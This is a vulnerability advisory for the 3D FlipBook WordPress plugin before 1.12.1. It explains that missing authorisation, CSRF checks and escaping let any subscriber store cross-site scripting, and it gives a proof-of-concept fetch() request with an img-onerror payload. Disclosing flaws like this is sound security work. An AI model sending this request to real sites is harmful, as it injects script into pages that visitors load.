## WordPress Plugin Vulnerabilities

# 3D FlipBook < 1.12.1 - Subscriber+ Stored Cross-Site Scripting

### Description

The plugin does not have authorisation and CSRF checks when updating its settings, and does not have any sanitisation/escaping, allowing any authenticated users, such as subscriber to put Cross-Site Scripting payloads in all pages with a 3d flipbook.

### Proof of Concept

As a subscriber:
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=fb3d\_receive\_book\_control\_props&props[lightbox][default]=xxx\"><img src onerror=alert(/XSS/)>",
"method": "POST",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
The XSS will be triggered in all pages with a 3d flipbook
